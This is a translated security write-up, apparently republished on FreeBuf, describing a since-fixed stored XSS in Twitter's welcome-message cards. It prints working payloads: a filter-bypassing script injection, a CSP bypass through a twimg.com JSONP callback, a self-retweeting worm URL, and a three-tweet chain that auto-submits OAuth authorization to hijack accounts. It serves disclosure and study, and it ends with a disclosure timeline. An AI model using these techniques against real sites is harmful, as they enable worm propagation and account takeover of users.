@@ -1,0 +1,274 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ****
+**2018年年中，当时我发现了一个Twitter的存储型XSS漏洞，该漏洞位于Twitter的犄角旮旯之处，一般人很难发现。重点在于，后来我又发现，这个存储型XSS漏洞可以被进一步构造形成一个稳定的XSS
+worm！**
+
+ **
+**![](https://image.3001.net/images/20190508/1557309827_5cd2a983027ce.png!small)****
+
+##  ****XSS Worm 介绍  
+
+XSS
+Worm（XSS蠕虫）是XSS漏洞利用的终极武器，也就是把XSS漏洞打造成蠕虫来进行广泛传播感染，安全威胁轻则为“恶作剧”，重则为窃取用户数据或瘫痪网络应用。早有2005年的Myspace蠕虫，19岁少年制作的XSS
+worm在短短几小时之内就通过Myspace空间感染了100万用户；还有2007年的百度空间蠕虫，至百度进行屏蔽防护时，这个XSS
+worm已经感染了8700多个博客空间。XSS
+worm对社交网站和大型社区论坛危害性极大。更多信息请参考[wikipedia](https://en.wikipedia.org/wiki/XSS_worm)。
+
+## 开门见山上XSS Worm Payload  
+
+###  **XSS Worm** Payload  
+
+开门见山，一来就上该Twitter XSS
+worm的漏洞利用URL链接（exploit）吧，稍后我们再详解其中的特别之处。在该XSS漏洞修复之前，通过Twitter发布以下URL链接就会创建出一个XSS
+worm来，它可以在推特圈内从一个账户中传播到另一个账户。该漏洞利用URL（exploit）如下：
+
+>
+> [https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E](https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E)
+
+经urldecode转换之后的URL链接如下：
+
+>
+> [https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=](https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=)<<x>/script><<x>iframe
+> id=__twttr
+> src=/intent/retweet?tweet_id=1114986988128624640><<x>/iframe><<x>script
+> src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12><<x>/script><<x>script
+> src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12>
+
+在Twitter中打开效果如下：
+
+![](https://image.3001.net/images/20190508/1557308978_5cd2a6322b129.jpg!small)可能你会好奇，“怎么可能？，它就是一个简单的URL链接啊！？”，但是，请相信它并不是一个普通的URL链接。它是一个Welcome
+Message（欢迎消息）的deeplink，且通过Twitter
+Card进行加载呈现（在Twitter中[点击链接加载](https://twitter.com/kyoko6516713624/status/1114991578353930240)），如下：  
+
+###
+![01.jpg](https://image.3001.net/images/20190508/1557308695_5cd2a5173f282.jpg!small)相关知识点
+
+ **Welcome Message（欢迎消息）**
+：自动弹出的消息，类似于关注别人微信微博后，别人私信窗口自动弹出的欢迎消息。<https://developer.twitter.com/en/docs/direct-messages/welcome-messages/overview>
+
+ **Deeplink**
+：多用于移动智能终端，字面意思“深度链接”，但实际并非如此，实际意图是，可以通过一个简单的URL链接，打开APP并直接进入该APP中的内文页，前提是该APP在该手机上已安装，且该APP需要编程支持该deeplink相关的语法定义。比如可复制一些淘宝商品及淘宝店铺页的deeplink链接，发送给其他人，他点击链接后，可以通过手机中安装的淘宝APP直接进入具体的商品页及店铺页。
+
+ **Twitter Card** ：就是在你的推文上加上一段代码链接，通过这种方式展示出更多信息，类似于Pinterest中的rich
+pin。目前Twitter Card支持Summary Card，Summary Card with Large Image，photo
+card，Gallery Card，APP Card，Player Card，Play Card: approve guide，Product Card
+8种方式的展示链接。
+
+好了，那么我是如何发现这个XSS Worm的呢？我们从一开始发现的XSS漏洞说来。
+
+## 发现初步的XSS漏洞
+
+上述的Twittce Card其实是一个iframe元素，它的展示指向链接为
+**"<https://twitter.com/i/cards/tfw/v1/1114991578353930240>"**
+。该iframe很明显是基于同源策略（same-origin）而不是沙盒，这意味着我们可以基于DOM同源策略访问同源网站下的父级页面。
+
+在我们一开始构造的漏洞利用URL链接中，把Payload作为参数"text"的值，如下：
+
+`text=<<x>/script><<x>iframe id=__twttr
+src=/intent/retweet?tweet_id=1114986988128624640><<x>/iframe><<x>script
+src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12><<x>/script><<x>script
+src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12>`
+
+在加载呈现漏洞利用URL的Twittce
+Card中，通过查看其中的展示指向链接网页源码可知，这个"text"参数反映在了一个内联JSON对象中，并赋值给了"
+**default_composer_text** "键值。如下：
+
+    
+    
+    <script type="text/twitter-cards-serialization">
+    
+      {
+    
+        "strings": { },
+    
+        "card": {
+    
+      "viewer_id" : "988260476659404801",
+    
+      "is_caps_enabled" : true,
+    
+      "forward" : "false",
+    
+      "is_logged_in" : true,
+    
+      "is_author" : true,
+    
+      "language" : "en",
+    
+      "card_name" : "2586390716:message_me",
+    
+      "welcome_message_id" : "988274596427304964",
+    
+      "token" : "[redacted]",
+    
+      "is_emojify_enabled" : true,
+    
+      "scribe_context" : "%7B%7D",
+    
+      "is_static_view" : false,
+    
+      "default_composer_text" : "</script><iframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640></iframe><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12></script><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12>\\u00A0",
+    
+      "recipient_id" : "988260476659404801",
+    
+      "card_uri" : "<https://t.co/1vVzoyquhh>",
+    
+      "render_card" : true,
+    
+      "tweet_id" : "1114991578353930240",
+    
+      "card_url" : "<https://t.co/1vVzoyquhh>"
+    
+    },
+    
+        "twitter_cldr": false,
+    
+        "scribeData": {
+    
+          "card_name": "2586390716:message_me",
+    
+          "card_url": "<https://t.co/1vVzoyquhh>"  
+    
+    
+        }
+    
+      }
+    
+    </script>
+
+请注意，HTML解析机制发现在起始的<script>后任何地方存在</script>闭合标签，无论是在字符串或评论或正则表达式中，那么，这种script脚本范围都会到此终止。
+
+在此之前，基于Twitter的安全防护环境、WAF部署和Web应用过滤规则，我们可能会遇到以下限制或障碍因素：
+
+> 1、目标系统把单引号和双引号分别转义为 `​\’` 和 `\”`；
+>
+> 2、HTML的某些敏感标签被直接过滤掉，如 `a</script>b` 直接被过滤为了`ab`；
+>
+> 3、或者是Payload长度被限制在300个字符内；
+>
+> 4、存在内容安全策略CSP，通过白名单方式来限制某些内联脚本（Inline Scripts）。
+
+起初来看，这些防护策略看似合理，但当我检查HTML标签的剥离动作时，我隐约觉得有些问题。由于这种剥离（去除）字符串中HTML标签的操作不像转义单独的字符，它需要用到HTML解析，HTML解析又经常会出错（象正则表达式之类的），所以在此，这种HTML标签剥离操作可以深入研究分析一下。
+
+于是，我立马动手构造了一个非常基本的Payload： **` </script><svg
+onload=alert()>**`，之后又构造了这个Payload： **` <</<x>/script/test000><</<x>svg
+onload=alert()></><script>1<\x>2`**，这个Payload经Twitter的HTML标签剥离操作后，变成了 **`
+</script/test000><svg
+onload=alert()>`**，啊哦，到了这一步，这个也算是个XSS漏洞了，在未继续深挖找到CSP绕过方法前，心急的我就向Twitter安全团队上报了。
+
+## Twitter的CSP策略绕过
+
+上报了这个XSS漏洞之后，我又继续研究Twitter的内容安全策略（CSP），这种网站的CSP可以通过抓包和工具检测出来。有意思的是，Twitter并没有在所有应用服务中部署[全局CSP策略](https://securityheaders.com/?q=https%3A%2F%2Fwww.twitter.com%2F&followRedirects=on)，也就是说，一些应用服务有着不一样的CSP策略。Twitter站点（<https://twitter.com/>）的完整CSP策略如下：
+
+![csp.png](https://image.3001.net/images/20190508/1557309230_5cd2a72e02d80.png!small)而Twitter
+Cards的CSP又是和以上完整的CSP不一样，我们在此只挑出Twitter Cards CSP中的script-src部分来看，如下：
+
+    
+    
+    script-src 'nonce-ETj41imzIQ/aBrjFcbynCg==' <https://twitter.com> https://*.twimg.com <https://ton.twitter.com> 'self'; frame-ancestors <https://ms2.twitter.com> <https://twitter.com> <http://localhost:8889> <https://momentmaker-local.twitter.com> <https://localhost.twitter.com> <https://tdapi-staging.smf1.twitter.com> <https://ms5.twitter.com> <https://momentmaker.twitter.com> <https://tweetdeck.localhost.twitter.com> <https://ms3.twitter.com> <https://tweetdeck.twitter.com> <https://wfa.twitter.com> <https://mobile.twitter.com> <https://ms1.twitter.com> 'self' <https://ms4.twitter.com>; font-src <https://twitter.com> https://*.twimg.com data: <https://ton.twitter.com> 'self'; media-src <https://twitter.com> https://*.twimg.com <https://ton.twitter.com> blob: 'self'; connect-src <https://caps.twitter.com> <https://cards.twitter.com> <https://cards-staging.twitter.com> <https://upload.twitter.com> blob: 'self'; style-src <https://twitter.com> https://*.twimg.com <https://ton.twitter.com> 'unsafe-inline' 'self'; object-src 'none'; default-src 'self'; frame-src <https://twitter.com> https://*.twimg.com https://* <https://ton.twitter.com> 'self'; img-src <https://twitter.com> https://*.twimg.com data: <https://ton.twitter.com> blob: 'self'; report-uri [https://twitter.com/i/csp_report?a=NVQWGYLXMNQXEZDT&ro=false](https://twitter.com/i/csp_report?a=NVQWGYLXMNQXEZDT&ro=false);
+
+以上策略对于老手来说， **https://*.twimg.com**
+这种通配符限制相对宽松，可能存在被攻击的风险点。所以，针对CSP策略绕过，结合上述Twitter
+Cards的JSON对象，我们现在需要找到一个位于twimg.com子域名下的JSON路径端点。其实也不难发现，这就是一个：
+**<https://syndication.twimg.com/timeline/profile?callback=__twttr>;user_id=12**
+
+这里现在的难点是，需要绕过回调验证（callback
+validation），不能任意指定其它回调，它只能以`__twttr`前缀开始，否则就会被Twitter阻拦。当然，这也就是说，你不能用如 'alert'
+这样的内置方法，可以用`__twttralert`，但可能会被解析认为`undefined`。针对这个方法，之后我就对Twitter的过滤策略做了一些测试，看看它会过滤和放行哪些字符。一测我便发现，正斜杠
+**'/'** 竟然在“callback” 参数中是可行的，也就是说类似 “ **?callback=__twttr/alert** ”
+这样是可以的，而且这种构造下的请求会收到以下形式的响应：
+
+`/**/__twttr/alert({"headers":{"status":200,"maxPosition":"1113300837160222720","minPosition":"1098761257606307840","xPolling":30,"time":1554668056},"body":"[...]"});`  
+
+所以现在我们只需找到一种方法，那就是在'window'对象（浏览器打开窗口）上定义`__twttr`引用，这里有两种方法来实现：
+
+> 1、找到一种符合白名单且定义了 `__twttr` 变量的脚本，把它包装到我们的Payload中；
+>
+> 2、将HTML元素的ID属性设置为`__twttr`，这样一来，它就能为'window'对象中的元素创建一个全局引用。
+
+在此，我选择第2种方法。如果做够这些，目前来看，应该没什么大问题。虽然我们不能在回调参数中注入任意字符，也就是说，会在JavaScript语法上受到的限制较多。但请注意，“?callback=__twttr/alert;user_id=12”中的分号并不是回调参数中的一部分，它只是查询分隔符，类似于&。但这并不是问题，我们仍然可以构造来调用一些我们想要的函数，就比如[Same
+Origin Method Execution攻击](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html)。
+
+总结来看，我们构造的完整Payload作用如下：
+
+> 1、创建一个有具备ID属性为__twttr的iframe元素， 这个元素通过Twitter Web Intents链接方式指向一条特定推文，这里我们用
+> **<https://twitter.com/intent/retweet?tweet_id=1114986988128624640>** ；
+>
+>
+> 2、绕过CSP策略调用一个同步方法函数，如`alert`，去推迟下一个脚本块的执行，直到上面的iframe元素完全加载执行。当然了，由于语法限制，这个`alert`同步方法函数不会具体地显示出来，另外，我们也不能简单地使用`setTimeout(func)`；
+>
+> 3、再次利用CSP策略绕过，通过提交iframe元素中的表单（form），去触发对某条特定推文的转推操作。
+
+## 构造XSS worm
+
+作为一个 XSS worm 来说，能进行自我转发是比较理想的。而且如果没有语法限制，构造XSS worm传播就相对简单。但现在我们只能依靠Twitter
+Web Intents方式来进行转推，这种方式下，需要在转推操作之前就要明确tweet ID，比较难的就是， tweet
+IDs并不是连续的，难以预测。所以，这里就卡住了。
+
+但是，我分析了一个，还有另外两种相对容易的方法来创建XSS Worm的传播态势：
+
+>
+> 1、“武器化”构造一系列推文链，每条推文中都包含对前一条推文的转发Payload，这样，只要你点击或转发到其中的一条推文，都将造成对整个推文链的不断转发操作，导致攻击链中活跃的Twitter账户都会执行这种操作，形成传播感染；
+>
+> 2、在转发推文中加入一些XSS Payload，也会造成更大范围的影响。
+
+当然了，可以把以上两种方法进行综合利用来进行传播感染，影响就能无限大了。好在这里，作为测试分析，我们最终构造的exploit中，当“
+**<https://twitter.com/intent/retweet?tweet_id=1114986988128624640>**
+”页面被受害者转发后，' **frames[0].retweet_btn_form.submit** ' 方法对应的随后操作不是继续转发。
+
+这里，第一次转发这条exploit推文后，它会立马把它的内容展现在你的Twitter主页中，之后，再次查看这条推文后，它会让你去关注攻击者的Twitter账户。
+
+## 深入构造利用 - 利用XSS Worm劫持Twitter用户
+
+XSS Worm除了传播感染，恶作剧之外，还有瘫痪网络应用或窃取用户信息的可能。所以，在此，我们基于这个XSS
+Worm，可以在其中加入一些恶意功能，比如可以通过强制Twitter用户对某些第三方恶意应用进行授权，以此隐蔽窃取受害者身份令牌，且能在Twitter的验证机制“oauth/authorize”
+中获得完整账户权限，实现Twitter账户劫持。
+
+为了实现这一点，攻击者可以在某个iframe元素中加载 “
+**<https://twitter.com/oauth/authorize?oauth_token=>[token]**”
+链接，自动提交该链接页面中的验证表单（其中包含如 `oauth_form`的ID属性），就能在随后的身份窃取中起到作用。
+
+最终，基于上述一大堆的传播功能构造，加入这种带有身份窃取功能的隐蔽XSS Worm分阶段运行如下：
+
+1、发送带有下面这个Payload的推文并获取其推文ID：
+
+`</script><iframe
+src=/oauth/authorize?oauth_token=cXDzjwAAAAAA4_EbAAABaizuCOk></iframe>`
+
+2、发送另一条推文并获取其推文ID：
+
+`</script><script id=__twttr
+src=//syndication.twimg.com/tweets.json?callback=__twttr/parent.frames[0].oauth_form.submit;ids=20></script>`
+
+3、发送第三条推文作为身份窃取劫持的Payload，这条推文综合了第一二条推文，并应用到了同一个页面链接中：
+
+`</script><iframe src=/i/cards/tfw/v1/1118608452136460288></iframe><iframe
+src=/i/cards/tfw/v1/1118609496560029696></iframe>`
+
+一旦Twitter受害者打开加载第三条推文后，攻击者控制的第三方恶意应用就能获取受害者的Twitter身份信息，实现账户劫持。要注意的是，"oauth_token"只能被进行一次身份验证，且其有效期非常短。但对一些不懈的攻击者来说，只要发送大量推文，就能劫持到很多用户权限。
+
+最为重要的是，攻击者还可以利用改造XSS Worm，强迫用户在Twitter上加载任意页面，点击任意按钮，提交任意表单等等恶意行为。
+
+## 漏洞上报进程
+
+> 2018.4.23 绕过过滤措施的XSS漏洞初报
+>
+> 2018.4.25 漏洞分类处理
+>
+> 2018.4.27 Twitter给出$2,940的奖励
+>
+> 2018.5.4 XSS漏洞修复
+>
+> 2019.4.7 我上报了CSP绕过漏洞
+>
+> 2019.4.12 考虑到XSS Worm的严重性，我直接给Twitter工程师发了write-up专报
+>
+> 2019.4.12 Twitter要求我待修复后再公开漏洞
+>
+> 2019.4.22 Twitter修复了CSP绕过漏洞并同意我进行漏洞公开
+>
+> 2019.5.2 我对漏洞进行了公开
+
+ ***参考来源：[virtuesecurity](https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/)，clouds编译，转载请注明来自FreeBuf.COM **  
+
